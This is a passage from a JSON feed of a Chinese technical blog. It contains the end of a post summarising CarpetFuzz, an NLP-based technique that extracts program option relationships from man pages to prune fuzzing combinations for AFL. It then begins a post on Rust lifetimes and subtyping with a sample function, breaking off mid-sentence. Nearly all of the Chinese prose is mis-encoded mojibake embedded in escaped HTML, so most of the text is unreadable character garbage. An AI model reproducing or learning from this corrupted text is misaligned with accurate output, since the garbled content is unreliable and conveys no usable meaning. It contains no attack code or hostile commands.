ï¼šé€šè¿‡æ£€æŸ¥å‚æ•°å¯¹ç¨‹åºè¿è¡Œçš„å½±å“æ¥åˆ¤æ–­æœ‰æ•ˆæ€§ï¼›</p>\n<p>Zellerç­‰äºº ï¼šé€šè¿‡ç‰¹å®šé€‰é¡¹è§£ææ¨¡å—æ¨æ–­ã€‚</p>\n<p><strong>å±€é™æ€§ï¼šæ•ˆç‡ä½</strong></p>\n<p><code>ConfigFuzz</code> ï¼šæ‰‹åŠ¨æ£€æŸ¥ï¼Œéœ€è¦ç†Ÿæ‚‰æµ‹è¯•çš„ç›®æ ‡è½¯ä»¶ç”¨æ³•ï¼Œå¯¹æµ‹è¯•äººå‘˜ä»¥åŠå¤§è§„æ¨¡æµ‹è¯•æ˜¯æ— æ³•æ¥å—çš„ã€‚</p>\n<h3 id=\"åŸºäºNLPçš„å…¶ä»–å·¥ä½œ\"><a href=\"#åŸºäºNLPçš„å…¶ä»–å·¥ä½œ\" class=\"headerlink\" title=\"åŸºäºNLPçš„å…¶ä»–å·¥ä½œ\"></a>åŸºäºNLPçš„å…¶ä»–å·¥ä½œ</h3><p>ä¸»è¦æ–¹å‘ï¼šä»£ç æ³¨é‡Š+ä¸¥æ ¼æ ¼å¼åŒ–æ–‡æ¡£ï¼Œå±€é™æ€§å¼º</p>\n<h2 id=\"ç¨‹åºç»“æ„\"><a href=\"#ç¨‹åºç»“æ„\" class=\"headerlink\" title=\"ç¨‹åºç»“æ„\"></a>ç¨‹åºç»“æ„</h2><p><img src=\"/carpet-fuzz/construction.png\" alt=\"Untitled\" loading=\"lazy\"></p>\n<p>Overview of CarpetFuzz. <strong>EDR: explicitly declared<br>relationships, IDR: implicitly declared relationships.</strong></p>\n<p>R&#x3D;Relationship</p>\n<p>æ•°æ®é›†æ¥æºï¼š<code>man</code> å‘½ä»¤çš„è¯´æ˜é¡µé¢</p>\n<p>æ‹†åˆ†å¥å­â†’è¯†åˆ«åŒ…å«é€‰é¡¹å…³ç³»çš„å¥å­ï¼ˆ<strong>Rå¥å­</strong>ï¼‰</p>\n<p>å…³ç³»ï¼š<strong>å†²çªã€ä¾èµ–ã€ï¼ˆè•´å«ã€ç›¸ä¼¼å’Œå–ä»£ &#x3D;å†²çªï¼Œå› ä¸ºå¤ç”¨ä¸èƒ½æœ‰æ•ˆå¢åŠ è¦†ç›–ç‡ï¼‰</strong></p>\n<p><img src=\"/carpet-fuzz/sentence-search.png\" alt=\"å¯»æ‰¾Rå¥å­\" loading=\"lazy\"></p>\n<p>å¯»æ‰¾Rå¥å­</p>\n<p>æ·»åŠ ä¸»è¯­æ˜¯ä¸ºäº†é¿å…NLPçš„è§£æé”™è¯¯ã€‚</p>\n<p>è¿˜æœ‰ä¸€ä¸ªé¢„å¤„ç†æ˜¯æŠŠé€‰é¡¹åå­—æ›¿æ¢ä¸ºè‡ªå®šä¹‰æ ‡è¯†ç¬¦ä»¥å…å¹²æ‰°åˆ†æï¼ˆè¿™æ€ä¹ˆå‘ç°çš„ï¼Ÿï¼‰ã€‚</p>\n<p>æŸä¸ªé€‰é¡¹çš„å…³é”®æ˜¯<strong>è°“è¯ï¼ˆæ•ˆæœï¼‰ä¸ç›®æ ‡ï¼ˆä½œç”¨å¯¹è±¡ï¼‰</strong>ã€‚</p>\n<h3 id=\"éšå¼çš„å†²çªå‚æ•°\"><a href=\"#éšå¼çš„å†²çªå‚æ•°\" class=\"headerlink\" title=\"éšå¼çš„å†²çªå‚æ•°\"></a>éšå¼çš„å†²çªå‚æ•°</h3><p>å®é™…ä¸Šï¼Œ<strong>éšå¼çš„æè¿°è¯­å¥åªæ¶‰åŠå†²çªï¼šä¾‹å¦‚ï¼Œ-Bå’Œ-Lé€‰é¡¹çš„æè¿°åˆ†åˆ«æ˜¯â€œForce output to be written with Big-Endian byte orderâ€å’Œâ€œForce output to be written with Little-Endian byte orderâ€</strong></p>\n<p>é‚£ä¹ˆè¿™äº›å¥å­çš„è¯­æ³•æ ‘ç»“æ„æ˜¯ç›¸åŒçš„ã€‚å› æ­¤è¿™äº›â€œsentence pairsâ€å¾ˆå…³é”®ï¼Œéœ€è¦è¢«æå–è¯†åˆ«ã€‚</p>\n<p>åŒæ—¶è¿˜æœ‰ä¸€äº›å¸¸è§çš„å†²çªå†™æ³•ï¼Œä¾‹å¦‚ç”¨<code>|</code> åˆ†éš”ã€‚å½“ç„¶è¿™ä¹Ÿå¯èƒ½æ˜¯åˆ«åï¼Œå…·ä½“çœ‹æè¿°å¥å­ä¸­æ˜¯â€œè¿™äº›å‚æ•°â€è¿˜æ˜¯â€œè¿™ä¸ªå‚æ•°â€æ¥ç¡®å®šåˆ°åº•æ˜¯åˆ«åè¿˜æ˜¯ä¸€äº›å†²çªçš„å‚æ•°ã€‚</p>\n<h3 id=\"ææ€§åˆ†æ\"><a href=\"#ææ€§åˆ†æ\" class=\"headerlink\" title=\"ææ€§åˆ†æ\"></a>ææ€§åˆ†æ</h3><p>æƒ…æ„Ÿåˆ†æå¸¸ç”¨ï¼Œè¿™é‡Œç”¨æ¥è§£æå‚æ•°ä¹‹é—´çš„å†²çª</p>\n<p><img src=\"/carpet-fuzz/nlp.png\" alt=\"Untitled\" loading=\"lazy\"></p>\n<p>ä¾‹å¦‚ä¸»è¯­Aå¯¹(B&amp;C)å‘ˆç°negativeçš„ææ€§ï¼Œæˆ‘ä»¬å°±å¯ä»¥è®¤ä¸ºAä¸èƒ½ä¸B&#x2F;Cä¸€èµ·ä½¿ç”¨ã€‚</p>\n<p><a href=\"https://github.com/JackKuo666/NLP_basis/blob/master/%E7%AC%AC%E5%9B%9B%E7%AB%A0%EF%BC%9A%E4%BE%9D%E5%AD%98%E5%8F%A5%E6%B3%95%E5%92%8C%E8%AF%AD%E4%B9%89%E4%BE%9D%E5%AD%98%E5%88%86%E6%9E%90.md\"></a></p>\n<aside>\nğŸ’¡ ä¸ªäººè®¤ä¸ºè¿™ä¸ªåšæ³•æ•ˆæœä¸é”™çš„åŸå› å¯èƒ½æ˜¯æ–‡ç« æåˆ°çš„\"combine with\"ã€\"imply\"ã€\"like\"ã€\"ignoreâ€è¿™äº›å…³é”®è¯ï¼ŒæŠ€æœ¯æ–‡æ¡£çš„è¯­æ³•è¿˜æ˜¯ç›¸å¯¹å¥½åˆ†æçš„ï¼Œå¯¹å¤æ‚çš„è¯­å¥å¯èƒ½ä¼šæœ‰é—®é¢˜ã€‚\næ‰€ä»¥å¦‚æœæŠŠè½¯ä»¶æŠ€æœ¯è®¨è®ºç¤¾åŒºçš„ç›¸å…³åšæ–‡ä¸¢è¿›å¤§æ¨¡å‹æ˜¯ä¸æ˜¯ä¼šæœ‰æ›´ä¸°å¯Œçš„ä¿¡æ¯è’¸é¦å‡ºæ¥ï¼Ÿ\n\n</aside>\n\n<p>ç¥ç»ç½‘ç»œå®ç°çš„åˆ†ç±»å™¨æ¥åˆ¤æ–­ä¸€ä¸ªå¥å­æœ‰å¤šå¤§å¯èƒ½æ˜¯Rå¥å­ã€‚å‡†ç¡®ç‡æ˜¯æ¯”è¾ƒé«˜çš„ï¼Œä½†å¬å›ç‡æ¯”æˆ‘æƒ³çš„å¤šã€‚</p>\n<h2 id=\"å®é™…æµ‹è¯•\"><a href=\"#å®é™…æµ‹è¯•\" class=\"headerlink\" title=\"å®é™…æµ‹è¯•\"></a>å®é™…æµ‹è¯•</h2><p>æ–‡ç« é¦–å…ˆè®¤ä¸ºå‚æ•°æ•°é‡è¶…è¿‡ä¸€å®šæ•°é‡æ²¡æœ‰å®é™…æ„ä¹‰ï¼ˆå¤§éƒ¨åˆ†ç”Ÿäº§ç¯å¢ƒä¸‹ä¹Ÿç”¨ä¸åˆ°æ›´å¤šçš„ï¼‰ã€‚æµ‹è¯•ä¹Ÿè¡¨æ˜åŸºæœ¬ä¸Šè¶…è¿‡6ä¸ªå‚æ•°å°±å¾ˆéš¾æœ‰æ–°çš„å‘ç°ã€‚æ‰€ä»¥ä½¿ç”¨6-wise</p>\n<p>ä¸ºäº†æ‰¾åˆ°æ›´æœ‰ä»·å€¼çš„å‚æ•°ç»„åˆï¼Œæµ‹è¯•å™¨ä¼šå…³æ³¨å‚æ•°çš„å˜åŒ–èƒ½å¤Ÿå¼•å¯¼å‡ºå¤šå°‘æ–°çš„ä»£ç è·¯å¾„è¦†ç›–ç‡ï¼›å¯¹äºå¤ªä½ä»·å€¼çš„ç»„åˆä¼šé€æ¸è¢«å‰ªææ‰ã€‚</p>\n<p>é‚£è¿™è¾¹å®é™…ä¸Šæ˜¯Song.çš„å·¥ä½œçš„Ideaäº†ã€‚</p>\n<h2 id=\"æ‚é¡¹\"><a href=\"#æ‚é¡¹\" class=\"headerlink\" title=\"æ‚é¡¹\"></a>æ‚é¡¹</h2><p>å‰©ä¸‹çš„ä¸»è¦æ˜¯ä¸€äº›å¯¹å®ç°ç»†èŠ‚ï¼ˆä¾‹å¦‚æ¨¡å‹è¶…å‚æ•°ã€é¢„å¤„ç†å·¥ä½œï¼‰çš„ä¸€äº›æè¿°ã€‚</p>\n<p>ç„¶åè¿˜æœ‰å°±æ˜¯æœ‰æ•ˆæ€§åº¦é‡ï¼Œä¸»è¦æ˜¯å‡†ç¡®ç‡å’Œæ€§èƒ½é€Ÿåº¦ã€‚</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">Q1. CarpetFuzzçš„æ€§èƒ½å¦‚ä½•ï¼Ÿ</span><br><span class=\"line\">Q2. å…³ç³»è¯†åˆ«çš„å‡†ç¡®æ€§å¦‚ä½•ï¼Ÿï¼ˆé‚£å¿…é¡»å¥½ï¼‰</span><br><span class=\"line\">Q3. å…³ç³»æå–çš„å‡†ç¡®æ€§å¦‚ä½•ï¼Ÿï¼ˆé‚£å¿…é¡»å¥½ï¼‰</span><br><span class=\"line\">**Q4. CarpetFuzzçš„ä¼˜å…ˆçº§æ’åºæŠ€æœ¯çš„æœ‰æ•ˆæ€§å¦‚ä½•ï¼Ÿ</span><br><span class=\"line\">  â€œç»“æœæ˜¾ç¤ºï¼Œç›¸æ¯”éšæœºæŠ½æ ·ï¼Œæˆ‘ä»¬çš„å‰ªææŠ€æœ¯å¯ä»¥å‡å°‘æ›´å¤šç»„åˆï¼ˆ<span class=\"number\">98.91</span>%ï¼‰ï¼Œ</span><br><span class=\"line\">åŒæ—¶ä»…ç•¥å¾®æŸå¤±è¾¹çš„è¦†ç›–ç‡ï¼ˆ<span class=\"number\">2.54</span>%ï¼‰â€**</span><br><span class=\"line\">Q5. ä¸æœ€å…ˆè¿›æŠ€æœ¯ç›¸æ¯”ï¼ŒCarpetFuzzçš„æ¨¡ç³Šæµ‹è¯•æ€§èƒ½å¦‚ä½•ï¼Ÿï¼ˆé‚£å¿…é¡»å¥½ï¼Œå› ä¸ºå‰äººçš„å·¥ä½œçœ‹èµ·æ¥ç¡®å®æ¯”è¾ƒç²—ç³™ï¼‰</span><br><span class=\"line\">Q6. CarpetFuzzèƒ½å¦å‘ç°çœŸå®ä¸–ç•Œçš„æ¼æ´ï¼Ÿï¼ˆäº‹å®è¯æ˜å¯ä»¥ï¼‰</span><br></pre></td></tr></table></figure>\n\n<p>åœ¨5æ¬¡48hçš„fuzzingä¸­ï¼Œ</p>\n<blockquote>\n<p>ç»“æœæ˜¾ç¤ºï¼Œå¹³å‡æœ‰94.59%çš„CarpetFuzzçš„å”¯ä¸€è¾¹æ²¡æœ‰è¢«å…¶ä»–æ¨¡ç³Šå™¨å‘ç°ï¼ŒCarpetFuzzå¹³å‡èƒ½å¤Ÿå¸®åŠ©AFLå‘ç°å¤šå‡º45.97%çš„è¾¹ã€‚</p>\n</blockquote>\n<p>è¾¹æŒ‡çš„æ˜¯æ„æˆä»£ç è·¯å¾„çš„jmpä¹‹ç±»çš„è·³è½¬ï¼Ÿ</p>\n<p>â€œå”¯ä¸€è¾¹â€è¿™ä¸ªæ€§èƒ½æŒ‡æ ‡ç¡®å®å¯ä»¥å±•ç¤ºå…¶èƒ½å‘ç°æ–°çš„æœªè¢«æ¢ç´¢è¿‡çš„ä»£ç è·¯å¾„ã€‚</p>\n<p>Real-worldæµ‹è¯•ä¹Ÿå‘ç°äº†å¾ˆå¤šç‰¹æ®Šçš„crashï¼Œç„¶åæåˆ°43ä¸ª0day</p>\n<h2 id=\"å±€é™æ€§\"><a href=\"#å±€é™æ€§\" class=\"headerlink\" title=\"å±€é™æ€§\"></a>å±€é™æ€§</h2><p>è¿™ç¯‡æ–‡ç« ä¹ŸæŒ‡å‡ºå±€é™æ€§ä¸»è¦æ¥è‡ªNLPæ¨¡å‹çš„å‡†ç¡®ç‡é—®é¢˜ï¼ˆçŒœåˆ°äº†ï¼‰ã€‚ä¸è¿‡å¥½åœ¨è¿™åŸºæœ¬åªä¼šå¯¼è‡´è·‘å¤ªå¤šæ— æ•ˆçš„æµ‹è¯•ï¼Œå¹¶ä¸æ€ä¹ˆæ¼æŠ¥ã€‚</p>\n<p>è¿˜æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯ç¼ºä¹äººç±»å¸¸è¯†ï¼Œä¾‹å¦‚ä»–ä¸çŸ¥é“æ°´å¹³å’Œå‚ç›´æ˜¯åä¹‰è¯ã€‚è§£å†³æ–¹æ¡ˆæ˜¯çŸ¥è¯†å›¾è°±ï¼ˆæ˜¯å¦æœ‰ç‚¹å¤ªå¤å…¸æœºå™¨å­¦ä¹ äº†ï¼‰</p>\n<p><strong>æˆ‘æ€ä¹ˆè§‰å¾—è¿™ä¿©é—®é¢˜éƒ½æ˜¯å¤§è¯­è¨€æ¨¡å‹æœ€æ“…é•¿çš„ï¼Ÿ</strong></p>\n<h2 id=\"æ–‡ç« æ€»ç»“\"><a href=\"#æ–‡ç« æ€»ç»“\" class=\"headerlink\" title=\"æ–‡ç« æ€»ç»“\"></a>æ–‡ç« æ€»ç»“</h2><p>åŸæ–‡æ‘˜æŠ„å¦‚ä¸‹ï¼š</p>\n<blockquote>\n<p>æˆ‘ä»¬è®¾è®¡å¹¶å®ç°äº†CarpetFuzzï¼Œä¸€ç§åŸºäºè‡ªç„¶è¯­è¨€å¤„ç†çš„æ¨¡ç³Šæµ‹è¯•è¾…åŠ©æŠ€æœ¯ï¼Œç”¨äºæå–ç¨‹åºé€‰é¡¹çº¦æŸã€‚é€šè¿‡é‡‡ç”¨ä¸»åŠ¨å­¦ä¹ ã€æœºå™¨å­¦ä¹ å’Œè‡ªç„¶è¯­è¨€å¤„ç†æŠ€æœ¯ï¼ŒCarpetFuzzèƒ½å¤Ÿå‡†ç¡®åœ°ä»æ–‡æ¡£ä¸­æå–é€‰é¡¹ä¹‹é—´çš„å…³ç³»ï¼Œå¹¶è¿‡æ»¤æ‰67.91%çš„ç»„åˆé€‰é¡¹ã€‚å€ŸåŠ©ç»è¿‡ä¿®å‰ªçš„æœ‰æ•ˆç»„åˆï¼ŒCarpetFuzzå¸®åŠ©AFLåœ¨20ä¸ªå¸¸ç”¨ç¨‹åºä¸­æ‰¾åˆ°äº†å…¶ä»–æ¨¡ç³Šå™¨æ— æ³•å‘ç°çš„è·¯å¾„çš„å¢åŠ äº†45.97%ï¼Œå¹¶å‘ç°äº†57ä¸ªç‹¬ç‰¹çš„å´©æºƒï¼Œå…¶ä¸­30ä¸ªè¢«åˆ†é…äº†CVE IDã€‚æ­¤å¤–ï¼ŒCarpetFuzzåœ¨ä¹‹å‰çš„åŸºå‡†æµ‹è¯•ä¸­å‘ç°äº†94ä¸ªç‹¬ç‰¹çš„å´©æºƒï¼Œæ˜¯ä¹‹å‰å·¥ä½œçš„1.71å€ã€‚</p>\n</blockquote>\n<p>æ„Ÿè°¢æ‚¨çš„é˜…è¯»ğŸ™‚</p>\n",
            "tags": [
                "NLP",
                "Fuzzing",
                "AFL"
            ]
        },
        {
            "id": "http://cubicy.icu/2023/09/05/rust-lifetime/",
            "url": "http://cubicy.icu/2023/09/05/rust-lifetime/",
            "title": "Rustç±»å‹ç³»ç»Ÿä¸­çš„ç”Ÿå‘½å‘¨æœŸ",
            "date_published": "2023-09-04T16:14:45.000Z",
            "content_html": "<h1 id=\"Rustç±»å‹ç³»ç»Ÿä¸­çš„ç”Ÿå‘½å‘¨æœŸ\"><a href=\"#Rustç±»å‹ç³»ç»Ÿä¸­çš„ç”Ÿå‘½å‘¨æœŸ\" class=\"headerlink\" title=\"Rustç±»å‹ç³»ç»Ÿä¸­çš„ç”Ÿå‘½å‘¨æœŸ\"></a>Rustç±»å‹ç³»ç»Ÿä¸­çš„ç”Ÿå‘½å‘¨æœŸ</h1><p><em>[2024-04-11 æ›´æ–°] ä¿®æ­£äº†ä¸€äº›é”™è¯¯ï¼Œé‡‡çº³äº†ä¸€äº›è¯»è€…åé¦ˆå¯ä»¥å¢åŠ çš„è§£é‡Šï¼Œåœ¨æ­¤è¡¨ç¤ºæ„Ÿè°¢ã€‚</em></p>\n<p>Rustçš„ç”Ÿå‘½å‘¨æœŸåº”è¢«è§†ä¸ºç±»å‹ç³»ç»Ÿçš„ä¸€éƒ¨åˆ†ã€‚è¿™æ˜¯æˆ‘çš„ç²—æµ…ç†è§£ï¼Œç†è§£é”™è¯¯éš¾å…ï¼Œè‹¥å‘ç°æ³è¯·æ–§æ­£ï¼<br>ä»¥ä¸‹å‡ èŠ‚è¯•å›¾æ¸è¿›åœ°ã€ä½†ä»ä¸åŒè§’åº¦ç†è§£è¯¥é—®é¢˜ï¼›åªè¦çœ‹æ‡‚ä¸€èŠ‚ä¹Ÿè®¸å°±è¶³å¤Ÿäº†ï¼Œæ‰€ä»¥å¯ä»¥éƒ½çœ‹çœ‹ï¼Ÿ<br><strong>æç¤ºï¼šå¦‚æœæ‚¨æœ‰å‡½æ•°å¼ç¼–ç¨‹åŸºç¡€ï¼Œè¿™ç¯‡æ–‡ç« çœ‹èµ·æ¥ä¼šå¾ˆå¹¼ç¨šã€‚â€œä¸å°±æ˜¯ä¸€å †monadå—ï¼Ÿâ€</strong></p>\n<hr>\n<p>ä¸€å¼€å§‹çœ‹åˆ°ç”Ÿå‘½å‘¨æœŸå’Œæ³›å‹å†™åœ¨ä¸€èµ·ä¹Ÿè®¸ä¼šæ„Ÿåˆ°è¯§å¼‚ï¼šä½†äº‹å®ä¸Šç”Ÿå‘½å‘¨æœŸå°±æ˜¯ç±»å‹ç³»ç»Ÿçš„ä¸€éƒ¨åˆ†ï¼Œæ³›å‹æŒ‡æ˜æŸä¸€å€¼èƒ½è¿›è¡Œä»€ä¹ˆè¿ç®—ï¼Œç”Ÿå‘½å‘¨æœŸæŒ‡æ˜æŸä¸€å€¼åœ¨ä»€ä¹ˆåŒºé—´å†…æ‰æœ‰æ•ˆã€æ‰å¯ä»¥å‚ä¸è¿ç®—ã€‚æ—¢ç„¶èƒ½æ¥å—æ³›å‹åŠ å…¥ç±»å‹ç³»ç»Ÿå¹¶å‚ä¸ç±»å‹çš„è¿ç®—ï¼Œç”Ÿå‘½å‘¨æœŸä¹Ÿåº”åŒç†ã€‚<br>è´´æ®µä»£ç å¤§ä¼™å¤§æ¦‚æ„Ÿå—ä¸€ä¸‹ï¼š</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">use</span> std::fmt::Display;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">longest_with_an_announcement</span>&lt;<span class=\"symbol\">&#x27;a</span>, T&gt;(x: &amp;<span class=\"symbol\">&#x27;a</span> <span class=\"type\">str</span>, y: &amp;<span class=\"symbol\">&#x27;a</span> <span class=\"type\">str</span>, ann: T) <span class=\"punctuation\">-&gt;</span> &amp;<span class=\"symbol\">&#x27;a</span> <span class=\"type\">str</span></span><br><span class=\"line\">    <span class=\"keyword\">where</span> T: Display</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">&quot;Announcement! &#123;&#125;&quot;</span>, ann);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> x.<span class=\"title function_ invoke__\">len</span>() &gt; y.<span class=\"title function_ invoke__\">len</span>() &#123;</span><br><span class=\"line\">        x</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        y</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>x,yæ˜¯å­—ç¬¦ä¸²sliceï¼Œåœ¨C&#x2F;C++ä¸­å¯¹åº”å­—ç¬¦ä¸²æŒ‡é’ˆï¼›åœ¨Cè¯­è¨€ä¸­ï¼Œè¿™æ ·çš„<strong>æŒ‡é’ˆåœ¨å­—ç¬¦ä¸²å¤±æ•ˆåæœ‰å¯èƒ½ä»è¢«è°ƒç”¨ï¼ˆæ‚¬å‚æŒ‡é’ˆï¼‰</strong>ï¼Œå°±å¸¦æ¥å±é™©ã€‚è€ŒRustå¦‚ä½•è§£å†³è¿™ä¸€é—®é¢˜å‘¢ï¼Ÿç­”æ¡ˆæ˜¯é€šè¿‡æ‰€æœ‰æƒæœºåˆ¶å’Œç”Ÿå‘½å‘¨æœŸï¼Œç¡®è®¤å€¼çš„æœ‰æ•ˆæœŸç©¶ç«Ÿä½•æ—¶å¼€å§‹ï¼Œä½•æ—¶ç»“æŸï¼ˆè¿™å°±ç§°ä¸º<strong>ç”Ÿå‘½å‘¨æœŸ</strong>ï¼‰ï¼Œç¦æ­¢åœ¨å€¼çš„ç”Ÿå‘½å‘¨æœŸå¤–è¿›è¡Œå¼•ç”¨ã€è¯»å–ã€ä¿®æ”¹ç­‰æ“ä½œã€‚<br>Rusté‡Œæ²¡æœ‰â€œèµ‹å€¼â€ï¼Œåªæœ‰â€œç»‘å®šâ€ï¼šæˆ‘ä»¬æŠŠä¸€ä¸ªå˜é‡åç»‘å®šåˆ°ä¸€ä¸ªå€¼ä¸Šï¼Œå› æ­¤è¿™äº›ç”Ÿå‘½å‘¨æœŸæ³¨è§£ï¼Œä»æ—§é’ˆå¯¹çš„æ˜¯å€¼ï¼šå®ƒæ˜¯ä¸€äº›å®é™…å­˜åœ¨çš„å€¼ï¼ˆå­—é¢é‡ã€å˜é‡å‚¨å­˜çš„å€¼ã€å‡½æ•°ã€é—­åŒ…â€¦â€¦ï¼‰çš„å›ºæœ‰å±æ€§ï¼Œä¸æ˜¯è™šæ— ç¼¥ç¼ˆçš„ã€‚  </p>\n<blockquote>\n<p>ğŸ“˜ æ ¹æ®ç°ä»£Rustè‡ªå¸¦çš„ä¸€äº›çº¦æŸæ¨å¯¼è§„åˆ™ï¼Œ~95%çš„æƒ…å†µä¸‹ç”Ÿå‘½å‘¨æœŸæ³¨è§£èƒ½è¢«ç¼–è¯‘å™¨è‡ªåŠ¨æ¨æ–­ã€‚ä½†æ‰‹åŠ¨çš„æ³¨è§£æœ‰æ—¶æ— æ³•é¿å…ï¼šå°¤å…¶æ˜¯ç»“æ„ä½“ä¸­ã€‚</p>\n</blockquote>\n<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œç”±äºè¿™ä¸ªifçš„å­˜åœ¨ï¼ŒRustç¼–è¯‘å™¨æ— æ³•åˆ¤æ–­è¿”å›å€¼çš„æœ‰æ•ˆæœŸåˆ°åº•å’Œxä¸€æ ·è¿˜æ˜¯å’Œyä¸€æ ·ã€‚<br>æˆ‘ä»¬è¦æ·»åŠ ç±»å‹æ¨æ–­ï¼ˆæ˜¯çš„ï¼Œç”Ÿå‘½å‘¨æœŸä¹Ÿæ˜¯ä¸€ç§æ³›å‹ï¼‰ï¼Œxã€yå…·æœ‰åŒåçš„ç”Ÿå‘½å‘¨æœŸæ³¨è§£â€™aï¼Œæ ¹æ®è§„åˆ™â€™aå–xå’Œyç”Ÿå‘½å‘¨æœŸçš„äº¤é›†ï¼šx,yéƒ½æœ‰æ•ˆæ—¶ï¼Œè¿”å›å€¼ä¸€å®šæœ‰æ•ˆï¼è¿™æ ·å°±é¿å…äº†C&#x2F;C++ä¸­æ‚¬å‚æŒ‡é’ˆå¸¦æ¥çš„å±é™©ã€‚  </p>\n<hr>\n<p>ä¹Ÿè®¸æœ‰äººä¼šé—®ï¼Œä¸ºä»€ä¹ˆè°ƒç”¨è¯¥å‡½æ•°æ—¶ï¼Œå¦‚æœä¼ å…¥çš„å‚æ•°ç”Ÿå‘½å‘¨æœŸä¸åŒï¼Œä¼šå–è¾ƒçŸ­çš„ï¼Ÿ<br>æˆ‘ä»¬è¦åœ¨é›†åˆè®ºçš„è§’åº¦è€ƒè™‘ï¼šæˆ‘ä»¬è¯´æƒ³è¦ä¸€åªåŠ¨ç‰©ï¼Œé‚£ä¹ˆç»™ä¸å¯çˆ±çš„çŒ«æ˜¯å¯ä»¥æ¥å—çš„ï¼Œå› ä¸ºçŒ«æ˜¯åŠ¨ç‰©çš„å­é›†ã€‚äº‹å®ä¸Šï¼Œå­é›†ï¼ˆ$\\subseteq$ï¼‰<strong>æ˜¯</strong>ä¸€ç§ååºå…³ç³»ã€‚è€Œç”Ÿå‘½å‘¨æœŸä¹Ÿ<strong>å­˜åœ¨</strong>ä¸€ç§ååºå…³ç³»ï¼šæˆ‘ä»¬æŠŠ<strong>è¿™ç§å…³ç³»å«subtype</strong>ã€‚å‡è®¾å¯¹äºä¸¤ä¸ªç”Ÿå‘½å‘¨æœŸL1å’Œç”Ÿå‘½å‘¨æœŸL2ï¼Œä¸”æœ‰L1æ˜¯L2çš„subtypeï¼Œé‚£æˆ‘ä»¬å°±è®°ä½œ<code>&#39;L1&lt;:&#39;L2</code>ï¼Œ<em>vice versa</em>.<br>æ˜¾ç„¶ï¼Œç”Ÿå‘½å‘¨æœŸè¶Šé•¿è¶Šâ€œå¥½â€ï¼ˆä¹Ÿå°±æ˜¯æ³›ç”¨ï¼‰ã€‚æ‰€ä»¥ä¸€å¼€å§‹æˆ‘ä»¬å°±çŸ¥é“<code>&#39;long &lt;: &#39;short</code>ï¼Œä¹Ÿå°±æ˜¯é•¿å¯¿çš„å¯ä»¥è‡ªè£(castè¿‡å»)å˜æˆçŸ­å‘½çš„ï¼Œä½†æ˜¯çŸ­å‘½çš„æ²¡æ³•å¼ºè¡Œç»­å‘½å˜æˆé•¿å‘½çš„ï¼ˆç±»æ¯”ä¸Šé¢çŒ«ä¸åŠ¨ç‰©çš„ä¾‹å­ï¼Œæˆ‘ä»¬è¦æ±‚ä¸€ä¸ªå‚æ•°éœ€è¦æœ‰ç‰¹å®šç”Ÿå‘½å‘¨æœŸæ—¶ï¼Œæ›´é•¿çš„ç”šè‡³staticéƒ½æ˜¯å¯ä»¥æ¥å—çš„ï¼Œä½†ç»ä¸èƒ½æ›´çŸ­ï¼šå¦åˆ™Rustå¸ƒé“è€…èµ–ä»¥ä¸ºç”Ÿçš„å†…å­˜å®‰å…¨è¦å‡ºäº‹äº†ï¼‰ã€‚<br>å½“ç„¶ï¼Œè¿˜æœ‰ä¸€ä¸ªæ˜¾ç„¶ï¼š<code>&#39;static</code>æ˜¯æ‰€æœ‰ç±»å‹çš„subtype.<br>(ä¸ç”¨å¤ªçº ç»“ä¸ºä»€ä¹ˆæ˜¯<code>&#39;long &lt;: &#39;short</code>ï¼Œååºå…³ç³»å€’è¿‡æ¥æ²¡æœ‰æœ¬è´¨åŒºåˆ«ï¼Œè¿™è¾¹åªæ˜¯å¼ºè°ƒ<code>&#39;long</code>æ›´å¥½ï¼Œç‰©ä»¥ç¨€ä¸ºè´µï¼Œæ‰€ä»¥â€œæ›´å°‘â€å°±æ”¾å·¦è¾¹äº†)<br>ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿ<strong>ç®€è€Œè¨€ä¹‹ï¼ŒL1çš„çº¦æŸæ¯”L2æ›´æ¾</strong>ã€‚æˆ‘ä»¬çœ‹ä¸€ä¸ªä¾‹å­ï¼Œè®¨è®º<strong>å‡½æ•°é—´</strong>çš„ååºå…³ç³»ï¼š</p>\n<ul>\n<li>å‡è®¾æœ‰å‡½æ•°f1(x)å’Œf2(x)ï¼Œå”¯ä¸€çš„åŒºåˆ«æ˜¯f1å¯¹ä¼ è¿›æ¥çš„xçš„ç”Ÿå‘½å‘¨æœŸçš„æœ€ä½è¦æ±‚æ›´é•¿ï¼Œé‚£ä¹ˆèƒ½ç”¨f1çš„åœ°æ–¹å°±èƒ½ç”¨f2ï¼Œä½†èƒ½ç”¨f2çš„åœ°æ–¹ä¸ä¸€å®šèƒ½ç”¨f1ï¼Œå› æ­¤f2æ›´æ³›ç”¨ï¼Œf2â‰¼f1</li>\n<li>å‡è®¾æœ‰å‡½æ•°f1()-&gt;xå’Œf2()-&gt;xï¼Œå”¯ä¸€çš„åŒºåˆ«æ˜¯f1çš„è¿”å›å€¼xçš„ç”Ÿå‘½å‘¨æœŸæ¯”f2çš„é•¿ï¼Œé‚£ä¹ˆéœ€è¦å…¶è¿”å›å€¼çš„åœ°æ–¹èƒ½ç”¨f2å°±ä¸€å®šèƒ½ç”¨f1ï¼Œåä¹‹åˆ™ä¸ç„¶ï¼Œå› 